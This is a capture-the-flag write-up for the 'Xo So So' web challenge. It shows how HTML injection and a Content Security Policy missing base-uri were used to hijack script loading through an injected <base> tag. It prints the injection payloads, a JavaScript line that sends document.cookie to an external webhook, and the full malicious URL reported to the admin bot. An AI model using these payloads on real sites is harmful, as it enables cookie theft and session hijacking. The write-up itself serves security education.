# Web - Xo So So

## Challenge description:

![Challenge](https://user-images.githubusercontent.com/70543460/204134551-e2767563-e04c-4af5-8311-52203013d185.png)

## Quick Navigation:

- **[(1) Testing the web application](https://github.com/Cyb3rDoctor/CyberWarriorsCTF2022/blob/main/XoSoSo.md#1-testing-the-web-application)**
- **[(2) HTML Injection](https://github.com/Cyb3rDoctor/CyberWarriorsCTF2022/blob/main/XoSoSo.md#2-html-injection)**
- **[(3) XSS - CSP Detection](https://github.com/Cyb3rDoctor/CyberWarriorsCTF2022/blob/main/XoSoSo.md#3-xss---csp-detection)**
- **[(4) XSS - Bypassing CSP and completing the challenge](https://github.com/Cyb3rDoctor/CyberWarriorsCTF2022/blob/main/XoSoSo.md#4-xss---bypassing-csp-and-completing-the-challenge)**

## Solution:

### (1) Testing the web application:

First, I started with testing the functionality of the web application:

The first part of the web application was "Space Gallery", and that's where you can view some planets images:

![image](https://user-images.githubusercontent.com/70543460/204109759-e4a3cbeb-b59e-4796-8922-399aaf3f63ad.jpg)
![image](https://user-images.githubusercontent.com/70543460/204110563-7fd54167-6679-4c31-bcd2-1cba6a34cb57.png)
![image](https://user-images.githubusercontent.com/70543460/204110536-7db4ea3f-1bc2-420b-a40f-649f429e7544.png)

<br/>

The second part of the web application was "Report To Admin" panel, and that's where you can enter a url to report to the admin:

![image](https://user-images.githubusercontent.com/70543460/204109804-a3cf414d-eacd-43ed-adf5-a2383c7c20e6.jpg)
![image](https://user-images.githubusercontent.com/70543460/204110109-0ed3d985-f120-444a-b673-cc283006375b.png)

I entered the URL of a webhook to test the functionality of "Report To Admin" panel:

![image](https://user-images.githubusercontent.com/70543460/204110656-2b6f739b-6b1e-4e85-9fe9-f8fac91ed95b.jpg)

And I got the following request:

![image](https://user-images.githubusercontent.com/70543460/204110920-1b17fa05-ab4e-453f-b317-4f538f24be0e.jpg)

<br/>

### (2) HTML Injection:

![image](https://user-images.githubusercontent.com/70543460/204302943-93bc6b60-293c-478b-acff-67050ba0949a.png)

![image](https://user-images.githubusercontent.com/70543460/204303167-5477f02f-09d9-406c-b6ab-679fac22c8db.png)

According the above behavior, I started injecting HTML codes into the webpage:

```html
'><h1>a</h1><img
```

![image](https://user-images.githubusercontent.com/70543460/204311745-f7953be5-dea3-404a-9911-3748e755d593.png)

![image](https://user-images.githubusercontent.com/70543460/204312749-70648c6c-c21e-4646-b984-9d36375b5b86.png)

<br/>

### (3) XSS - CSP Detection:

As I was able to inject HTML codes, I tried triggering XSS but I couldn't:

![image](https://user-images.githubusercontent.com/70543460/204336153-f79f7978-16b8-4af3-82c7-27a586aa8d91.jpg)
![image](https://user-images.githubusercontent.com/70543460/204336298-4adfa6fd-ee82-4741-8645-7130dda07a5c.jpg)

One of the ways to protect from cross-site scripting (XSS) is the Content Protection Policy (CSP):
![image](https://user-images.githubusercontent.com/70543460/204336960-ddf58243-2446-455c-978a-80be222d0b62.png)

Content Security Policy is implemented via response headers or meta elements of the HTML page, and the CSP in this challenge is implemented via the meta tag:
![image](https://user-images.githubusercontent.com/70543460/209553562-74c2ee5c-a5a0-4c31-a06d-ae5390ae9b7c.png)

<br/>

### (4) XSS - Bypassing CSP and completing the challenge:

After detecting the CSP I used this CSP Evaluator (ttps://csp-evaluator.withgoogle.com/), and it showed a high severity finding because the **base-uri** directive is missing:

![image](https://user-images.githubusercontent.com/70543460/209554855-5f7e01f0-4ab1-42c0-b86f-c20ac6091311.png)

![image](https://user-images.githubusercontent.com/70543460/209555061-35620601-6734-4ac6-915a-3d64ff45968a.png)

![image](https://user-images.githubusercontent.com/70543460/209554941-4c1ab910-23e9-41e8-a8ba-e19666139496.png)

According to the result of the CSP Evaluator and after reading more about the **base-uri** CSP directive and what I can do if that directive is missing, I put my webhook link in the href attribute in the base tag, and that because I wanted so see what does the server requests/tries to load:

```html
'><base href="https://eogzeqepdhvfwr5.m.pipedream.net"><img
```

![image](https://user-images.githubusercontent.com/70543460/209556337-cd831d4b-a056-40dc-8ba4-104c626f70c6.png)

![image](https://user-images.githubusercontent.com/70543460/209556393-01e91b14-9e17-474b-85c1-57fd2553d49f.png)

And I got the following request:

![image](https://user-images.githubusercontent.com/70543460/209556486-e6aa5edf-77d7-4455-94a7-453f8dda3e3a.png)

According to that, I tried abusing the base tag to make it load that script (/assets/js/bootstrap.js) from my machine to achieve XSS.

I started with creating a javascript file with the same path and name (bootstrap.js) in my machine:

```javascript
document.location='https://eogzeqepdhvfwr5.m.pipedream.net/id?c='+encodeURIComponent(btoa(document.cookie));
```

![image](https://user-images.githubusercontent.com/70543460/209557054-209aeb8c-1a43-41e2-ad72-7b72bc7f2c37.png)

After that, I started a python http server and used ngrok to make it publicly accessible:

![image](https://user-images.githubusercontent.com/70543460/209557317-f892e350-6f9f-4d67-8ade-03e794d46c02.jpg)
 
![image](https://user-images.githubusercontent.com/70543460/209557404-889145b4-1fed-4def-ae81-0c71a991efc6.png)

![image](https://user-images.githubusercontent.com/70543460/209557516-bf08f2ad-8bea-4941-959f-ad5bbbdb178c.png)

After that, I reported the following URL which contains the injected base tag with my web server link:
```
http://3.90.185.122:8080/index.php?src='><base href="https://3036-188-247-77-80.ngrok.io/"><img
```

![image](https://user-images.githubusercontent.com/70543460/209557830-5524c66e-2b06-4e51-857e-3d64ef298a41.jpg)

Finally, I checked my webhook logs and got the cookie that contains the flag 🥳

![image](https://user-images.githubusercontent.com/70543460/209557931-070038f2-f8b1-47b1-8dc9-17ca6b51f0ec.jpg)

![image](https://user-images.githubusercontent.com/70543460/209557988-769bf153-e949-40cd-8971-d020b7339a49.jpg)

<br/>

----------

### Good moment:

We submitted the flag of this challenge in the last minute of the competition, thuse we got the second place with the same points as the first place:

![lastMinute](https://user-images.githubusercontent.com/70543460/209558194-a17c7f7c-6a61-4ae2-a6eb-410826cc21da.jpg)

![Scoreboard](https://user-images.githubusercontent.com/70543460/204103410-f32d443e-2c96-4219-aa67-c30a3d7b729c.png)
